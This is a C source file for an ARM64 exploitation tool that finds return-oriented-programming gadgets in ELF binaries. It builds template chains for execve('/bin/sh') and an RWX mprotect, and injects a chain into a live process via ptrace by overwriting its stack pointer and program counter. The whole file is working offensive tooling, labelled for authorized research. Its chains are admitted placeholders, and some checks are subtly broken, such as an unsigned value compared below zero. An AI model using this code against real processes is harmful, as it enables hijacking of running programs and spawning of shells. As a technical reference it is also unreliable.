/*
 * Auris - ROP Chain Builder
 * Find gadgets and build ROP chains for ARM64
 * 
 * WARNING: For authorized security research only.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

#include "auris.h"
#include "inject.h"

/* ARM64 instruction patterns */
#define ARM64_RET       0xd65f03c0  /* ret */
#define ARM64_RET_MASK  0xffffffff

#define ARM64_SVC       0xd4000001  /* svc #0 */
#define ARM64_SVC_MASK  0xffe0001f

#define ARM64_BLR_MASK  0xfffffc1f  /* blr xN */
#define ARM64_BLR_BASE  0xd63f0000

#define ARM64_BR_MASK   0xfffffc1f  /* br xN */
#define ARM64_BR_BASE   0xd61f0000

#define ARM64_LDP_MASK  0xffc003e0  /* ldp with post-index */
#define ARM64_LDP_BASE  0xa8c003e0

/* Maximum gadget search depth (instructions before ret) */
#define MAX_GADGET_DEPTH 5

/* Initial gadget capacity */
#define INITIAL_GADGET_CAPACITY 1024

/*
 * Check if instruction is a RET
 */
static bool is_ret(uint32_t insn)
{
    return (insn & ARM64_RET_MASK) == ARM64_RET;
}

/*
 * Check if instruction is SVC (syscall)
 */
static bool is_svc(uint32_t insn)
{
    return (insn & ARM64_SVC_MASK) == ARM64_SVC;
}

/*
 * Check if instruction is BLR (branch with link to register)
 */
static bool is_blr(uint32_t insn)
{
    return (insn & ARM64_BLR_MASK) == ARM64_BLR_BASE;
}

/*
 * Check if instruction is BR (branch to register)
 */
static bool is_br(uint32_t insn)
{
    return (insn & ARM64_BR_MASK) == ARM64_BR_BASE;
}

/*
 * Check if instruction loads from stack (useful for control)
 * LDP Xn, Xm, [SP], #imm  or  LDR Xn, [SP, #imm]
 */
static bool loads_from_stack(uint32_t insn, int *reg1, int *reg2)
{
    /* LDP with SP base */
    if ((insn & 0xffc003e0) == 0xa9400000 ||  /* ldp pre-index */
        (insn & 0xffc003e0) == 0xa8c00000) {  /* ldp post-index */
        if (reg1) *reg1 = insn & 0x1f;
        if (reg2) *reg2 = (insn >> 10) & 0x1f;
        return true;
    }
    
    /* LDR with SP base */
    if ((insn & 0xffc003e0) == 0xf9400000) {  /* ldr [sp, #imm] */
        if (reg1) *reg1 = insn & 0x1f;
        if (reg2) *reg2 = -1;
        return true;
    }
    
    return false;
}

/*
 * Classify gadget type based on instructions
 */
static uint32_t classify_gadget(const uint8_t *code, size_t len)
{
    uint32_t type = 0;
    
    if (len < 4) return 0;
    
    /* Check last instruction */
    uint32_t last_insn = *(uint32_t *)(code + len - 4);
    
    if (is_ret(last_insn)) {
        type |= GADGET_TYPE_RET;
    }
    if (is_svc(last_insn)) {
        type |= GADGET_TYPE_SYSCALL;
    }
    if (is_blr(last_insn)) {
        type |= GADGET_TYPE_CALL;
    }
    
    /* Check for register loads */
    for (size_t i = 0; i + 4 <= len; i += 4) {
        uint32_t insn = *(uint32_t *)(code + i);
        int reg1 = -1, reg2 = -1;
        
        if (loads_from_stack(insn, &reg1, &reg2)) {
            if (reg1 == 0) type |= GADGET_TYPE_LOAD_X0;
            if (reg1 == 1 || reg2 == 1) type |= GADGET_TYPE_LOAD_X1;
            if (reg1 == 2 || reg2 == 2) type |= GADGET_TYPE_LOAD_X2;
            if (reg1 == 8 || reg2 == 8) type |= GADGET_TYPE_LOAD_X8;
            if (reg1 == 31 || reg2 == 31) type |= GADGET_TYPE_STACK_PIVOT;
        }
        
        /* Check for SP modification */
        /* add sp, sp, #imm */
        if ((insn & 0xff0003ff) == 0x910003ff) {
            type |= GADGET_TYPE_STACK_PIVOT;
        }
    }
    
    return type;
}

/*
 * Simple ARM64 disassembly (very basic)
 */
static void disasm_insn(uint32_t insn, char *buf, size_t buflen)
{
    if (is_ret(insn)) {
        snprintf(buf, buflen, "ret");
    } else if (is_svc(insn)) {
        snprintf(buf, buflen, "svc #0");
    } else if (is_blr(insn)) {
        int reg = (insn >> 5) & 0x1f;
        snprintf(buf, buflen, "blr x%d", reg);
    } else if (is_br(insn)) {
        int reg = (insn >> 5) & 0x1f;
        snprintf(buf, buflen, "br x%d", reg);
    } else if ((insn & 0xff0003ff) == 0x910003ff) {
        /* add sp, sp, #imm */
        int imm = (insn >> 10) & 0xfff;
        snprintf(buf, buflen, "add sp, sp, #%d", imm * 4);
    } else if ((insn & 0xffc003e0) == 0xa9400000) {
        /* ldp pre-index */
        int rt = insn & 0x1f;
        int rt2 = (insn >> 10) & 0x1f;
        snprintf(buf, buflen, "ldp x%d, x%d, [sp, #...]", rt, rt2);
    } else if ((insn & 0xffc003e0) == 0xa8c00000) {
        /* ldp post-index */
        int rt = insn & 0x1f;
        int rt2 = (insn >> 10) & 0x1f;
        snprintf(buf, buflen, "ldp x%d, x%d, [sp], #...", rt, rt2);
    } else {
        snprintf(buf, buflen, ".word 0x%08x", insn);
    }
}

/*
 * Find ROP gadgets in a memory region
 */
static sg_error_t find_gadgets_in_region(const uint8_t *code, size_t len,
                                          uint64_t base_addr,
                                          sg_gadget_db_t *db)
{
    /* Scan for RET instructions and work backwards */
    for (size_t i = 0; i + 4 <= len; i += 4) {
        uint32_t insn = *(uint32_t *)(code + i);
        
        /* Look for gadget-ending instructions */
        if (!is_ret(insn) && !is_svc(insn) && !is_blr(insn)) {
            continue;
        }
        
        /* Found a potential gadget end, work backwards */
        for (int depth = 1; depth <= MAX_GADGET_DEPTH; depth++) {
            size_t gadget_start = i - (depth - 1) * 4;
            if (gadget_start < 0 || gadget_start > i) {
                break;
            }
            
            size_t gadget_len = (depth) * 4;
            
            /* Classify the gadget */
            uint32_t type = classify_gadget(code + gadget_start, gadget_len);
            
            if (type == 0) {
                continue;  /* Not useful */
            }
            
            /* Expand db if needed */
            if (db->gadget_count >= db->gadget_capacity) {
                size_t new_cap = db->gadget_capacity * 2;
                sg_rop_gadget_t *new_gadgets = realloc(db->gadgets,
                                                        new_cap * sizeof(sg_rop_gadget_t));
                if (new_gadgets == NULL) {
                    return SG_ERR_NOMEM;
                }
                db->gadgets = new_gadgets;
                db->gadget_capacity = new_cap;
            }
            
            /* Add gadget */
            sg_rop_gadget_t *g = &db->gadgets[db->gadget_count];
            memset(g, 0, sizeof(*g));
            
            g->address = base_addr + gadget_start;
            g->length = gadget_len;
            g->type = type;
            
            if (gadget_len <= sizeof(g->bytes)) {
                memcpy(g->bytes, code + gadget_start, gadget_len);
            }
            
            /* Build disassembly string */
            char *p = g->disasm;
            size_t remaining = sizeof(g->disasm);
            
            for (size_t j = 0; j < gadget_len && remaining > 10; j += 4) {
                uint32_t ins = *(uint32_t *)(code + gadget_start + j);
                char tmp[32];
                disasm_insn(ins, tmp, sizeof(tmp));
                
                int n = snprintf(p, remaining, "%s%s", 
                                 j > 0 ? "; " : "", tmp);
                p += n;
                remaining -= n;
            }
            
            db->gadget_count++;
        }
    }
    
    return SG_OK;
}

/*
 * Find ROP gadgets in a binary file
 */
sg_error_t sg_rop_find_gadgets(const char *binary_path,
                                uint64_t base_addr,
                                sg_gadget_db_t **db_out)
{
    if (binary_path == NULL || db_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    /* Open and map the file */
    int fd = open(binary_path, O_RDONLY);
    if (fd < 0) {
        sg_log(SG_LOG_ERROR, "Failed to open %s", binary_path);
        return SG_ERR_IO;
    }
    
    struct stat st;
    if (fstat(fd, &st) < 0) {
        close(fd);
        return SG_ERR_IO;
    }
    
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    
    if (map == MAP_FAILED) {
        return SG_ERR_IO;
    }
    
    /* Allocate gadget database */
    sg_gadget_db_t *db = calloc(1, sizeof(sg_gadget_db_t));
    if (db == NULL) {
        munmap(map, st.st_size);
        return SG_ERR_NOMEM;
    }
    
    db->gadgets = calloc(INITIAL_GADGET_CAPACITY, sizeof(sg_rop_gadget_t));
    if (db->gadgets == NULL) {
        free(db);
        munmap(map, st.st_size);
        return SG_ERR_NOMEM;
    }
    db->gadget_capacity = INITIAL_GADGET_CAPACITY;
    
    sg_safe_strncpy(db->binary_path, binary_path, sizeof(db->binary_path));
    db->base_address = base_addr;
    
    /* Parse ELF to find executable sections */
    Elf64_Ehdr *ehdr = map;
    
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        sg_log(SG_LOG_ERROR, "Not an ELF file: %s", binary_path);
        sg_rop_free_gadgets(db);
        munmap(map, st.st_size);
        return SG_ERR_PARSE;
    }
    
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        sg_log(SG_LOG_ERROR, "Not a 64-bit ELF: %s", binary_path);
        sg_rop_free_gadgets(db);
        munmap(map, st.st_size);
        return SG_ERR_PARSE;
    }
    
    /* Find executable segments */
    Elf64_Phdr *phdr = (Elf64_Phdr *)((uint8_t *)map + ehdr->e_phoff);
    
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
            /* Executable segment */
            uint64_t seg_addr = base_addr + phdr[i].p_vaddr;
            const uint8_t *seg_data = (uint8_t *)map + phdr[i].p_offset;
            size_t seg_size = phdr[i].p_filesz;
            
            sg_log(SG_LOG_DEBUG, "Scanning segment at 0x%lx, size %zu",
                   seg_addr, seg_size);
            
            sg_error_t err = find_gadgets_in_region(seg_data, seg_size,
                                                     seg_addr, db);
            if (err != SG_OK) {
                sg_rop_free_gadgets(db);
                munmap(map, st.st_size);
                return err;
            }
        }
    }
    
    munmap(map, st.st_size);
    
    sg_log(SG_LOG_INFO, "Found %zu gadgets in %s", db->gadget_count, binary_path);
    
    *db_out = db;
    return SG_OK;
}

/*
 * Free gadget database
 */
void sg_rop_free_gadgets(sg_gadget_db_t *db)
{
    if (db == NULL) {
        return;
    }
    
    if (db->gadgets != NULL) {
        free(db->gadgets);
    }
    free(db);
}

/*
 * Find gadget by type
 */
sg_rop_gadget_t *sg_rop_find_gadget_by_type(sg_gadget_db_t *db, uint32_t type)
{
    if (db == NULL) {
        return NULL;
    }
    
    for (size_t i = 0; i < db->gadget_count; i++) {
        if ((db->gadgets[i].type & type) == type) {
            return &db->gadgets[i];
        }
    }
    
    return NULL;
}

/*
 * Allocate ROP chain
 */
static sg_rop_chain_t *alloc_chain(size_t initial_capacity)
{
    sg_rop_chain_t *chain = calloc(1, sizeof(sg_rop_chain_t));
    if (chain == NULL) {
        return NULL;
    }
    
    chain->chain = calloc(initial_capacity, sizeof(uint64_t));
    if (chain->chain == NULL) {
        free(chain);
        return NULL;
    }
    
    chain->capacity = initial_capacity;
    return chain;
}

/*
 * Add value to ROP chain
 */
static sg_error_t chain_push(sg_rop_chain_t *chain, uint64_t value)
{
    if (chain->length >= chain->capacity) {
        size_t new_cap = chain->capacity * 2;
        uint64_t *new_chain = realloc(chain->chain, new_cap * sizeof(uint64_t));
        if (new_chain == NULL) {
            return SG_ERR_NOMEM;
        }
        chain->chain = new_chain;
        chain->capacity = new_cap;
    }
    
    chain->chain[chain->length++] = value;
    return SG_OK;
}

/*
 * Build ROP chain for execve("/bin/sh", NULL, NULL)
 * 
 * This is highly dependent on available gadgets.
 * We need:
 * - Gadget to load x0 (path pointer)
 * - Gadget to load x1 (argv = NULL)
 * - Gadget to load x2 (envp = NULL)
 * - Gadget to load x8 (syscall number = 221)
 * - SVC gadget
 */
sg_error_t sg_rop_build_execve_chain(sg_gadget_db_t *db,
                                      const char *command,
                                      sg_rop_chain_t **chain_out)
{
    if (db == NULL || chain_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    /* Find required gadgets */
    sg_rop_gadget_t *load_x0 = sg_rop_find_gadget_by_type(db, 
                                GADGET_TYPE_LOAD_X0 | GADGET_TYPE_RET);
    sg_rop_gadget_t *load_x8 = sg_rop_find_gadget_by_type(db,
                                GADGET_TYPE_LOAD_X8 | GADGET_TYPE_RET);
    sg_rop_gadget_t *syscall = sg_rop_find_gadget_by_type(db,
                                GADGET_TYPE_SYSCALL);
    
    if (load_x0 == NULL) {
        sg_log(SG_LOG_ERROR, "Could not find gadget to load x0");
        return SG_ERR_NOT_FOUND;
    }
    
    if (syscall == NULL) {
        sg_log(SG_LOG_ERROR, "Could not find syscall gadget");
        return SG_ERR_NOT_FOUND;
    }
    
    sg_rop_chain_t *chain = alloc_chain(32);
    if (chain == NULL) {
        return SG_ERR_NOMEM;
    }
    
    sg_safe_strncpy(chain->description, "execve(\"/bin/sh\", NULL, NULL)",
                    sizeof(chain->description));
    
    /* Build the chain */
    /* This is a simplified example - real chains are more complex */
    
    /* Note: The actual chain structure depends heavily on the specific
     * gadgets found. This is a placeholder that shows the concept. */
    
    /* Push gadget addresses and values in reverse order (stack grows down) */
    
    /* For a real implementation, we'd need to:
     * 1. Analyze each gadget to understand stack adjustment
     * 2. Place values at correct offsets
     * 3. Handle gadgets that load multiple registers
     */
    
    chain_push(chain, load_x0->address);
    chain_push(chain, 0);  /* Placeholder for /bin/sh address */
    
    if (load_x8 != NULL) {
        chain_push(chain, load_x8->address);
        chain_push(chain, 221);  /* execve syscall number */
    }
    
    chain_push(chain, syscall->address);
    
    sg_log(SG_LOG_WARN, "ROP chain is a template - requires manual adjustment");
    
    *chain_out = chain;
    return SG_OK;
}

/*
 * Build ROP chain for mprotect
 */
sg_error_t sg_rop_build_mprotect_chain(sg_gadget_db_t *db,
                                        uint64_t addr,
                                        size_t len,
                                        sg_rop_chain_t **chain_out)
{
    if (db == NULL || chain_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    /* mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC) */
    /* syscall 226 on ARM64 */
    
    sg_rop_gadget_t *load_x0 = sg_rop_find_gadget_by_type(db,
                                GADGET_TYPE_LOAD_X0 | GADGET_TYPE_RET);
    sg_rop_gadget_t *syscall = sg_rop_find_gadget_by_type(db,
                                GADGET_TYPE_SYSCALL);
    
    if (load_x0 == NULL || syscall == NULL) {
        return SG_ERR_NOT_FOUND;
    }
    
    sg_rop_chain_t *chain = alloc_chain(32);
    if (chain == NULL) {
        return SG_ERR_NOMEM;
    }
    
    snprintf(chain->description, sizeof(chain->description),
             "mprotect(0x%lx, %zu, RWX)", addr, len);
    
    /* Placeholder chain */
    chain_push(chain, load_x0->address);
    chain_push(chain, addr);
    chain_push(chain, syscall->address);
    
    *chain_out = chain;
    return SG_OK;
}

/*
 * Free ROP chain
 */
void sg_rop_free_chain(sg_rop_chain_t *chain)
{
    if (chain == NULL) {
        return;
    }
    
    if (chain->chain != NULL) {
        free(chain->chain);
    }
    free(chain);
}

/*
 * Inject and execute ROP chain
 */
sg_error_t sg_inject_rop_chain(sg_inject_ctx_t *ctx,
                                sg_rop_chain_t *chain,
                                sg_inject_result_t *result)
{
    if (ctx == NULL || chain == NULL || result == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    memset(result, 0, sizeof(*result));
    
    /* Attach if needed */
    sg_error_t err = sg_inject_attach(ctx);
    if (err != SG_OK) {
        result->error = err;
        return err;
    }
    
    /* Save registers */
    err = sg_inject_save_regs(ctx);
    if (err != SG_OK) {
        result->error = err;
        return err;
    }
    
    /* Get current SP */
    sg_arm64_regs_t regs;
    err = sg_inject_read_regs(ctx->target.pid, &regs);
    if (err != SG_OK) {
        result->error = err;
        return err;
    }
    
    /* Write ROP chain to stack */
    uint64_t chain_addr = regs.sp - (chain->length * 8) - 64;
    chain_addr &= ~0xf;  /* Align to 16 bytes */
    
    ssize_t n = sg_inject_write_mem(ctx->target.pid, chain_addr,
                                     chain->chain, chain->length * 8);
    if (n < (ssize_t)(chain->length * 8)) {
        result->error = SG_ERR_PTRACE;
        snprintf(result->error_msg, sizeof(result->error_msg),
                 "Failed to write ROP chain to stack");
        return SG_ERR_PTRACE;
    }
    
    /* Set SP to our chain and trigger first gadget */
    regs.sp = chain_addr;
    regs.pc = chain->chain[0];  /* First gadget address */
    
    err = sg_inject_write_regs(ctx->target.pid, &regs);
    if (err != SG_OK) {
        result->error = err;
        return err;
    }
    
    ctx->injection_active = true;
    
    /* Continue execution */
    if (ptrace(PTRACE_CONT, ctx->target.pid, NULL, NULL) < 0) {
        result->error = SG_ERR_PTRACE;
        return SG_ERR_PTRACE;
    }
    
    /* Wait for completion */
    int status;
    waitpid(ctx->target.pid, &status, 0);
    
    if (WIFSTOPPED(status)) {
        result->success = true;
    }
    
    /* Restore */
    sg_inject_restore_regs(ctx);
    ctx->injection_active = false;
    
    return SG_OK;
}

/*
 * Print gadget database summary
 */
void sg_rop_print_gadgets(sg_gadget_db_t *db, size_t max_count)
{
    if (db == NULL) {
        return;
    }
    
    printf("Gadget Database: %s\n", db->binary_path);
    printf("Base Address: 0x%lx\n", db->base_address);
    printf("Total Gadgets: %zu\n\n", db->gadget_count);
    
    size_t count = db->gadget_count;
    if (max_count > 0 && count > max_count) {
        count = max_count;
    }
    
    for (size_t i = 0; i < count; i++) {
        sg_rop_gadget_t *g = &db->gadgets[i];
        
        printf("0x%016lx: %s", g->address, g->disasm);
        
        /* Print type flags */
        printf(" [");
        if (g->type & GADGET_TYPE_RET) printf("RET ");
        if (g->type & GADGET_TYPE_SYSCALL) printf("SVC ");
        if (g->type & GADGET_TYPE_CALL) printf("CALL ");
        if (g->type & GADGET_TYPE_LOAD_X0) printf("X0 ");
        if (g->type & GADGET_TYPE_LOAD_X1) printf("X1 ");
        if (g->type & GADGET_TYPE_LOAD_X8) printf("X8 ");
        if (g->type & GADGET_TYPE_STACK_PIVOT) printf("PIVOT ");
        printf("]\n");
    }
    
    if (db->gadget_count > count) {
        printf("... and %zu more\n", db->gadget_count - count);
    }
}
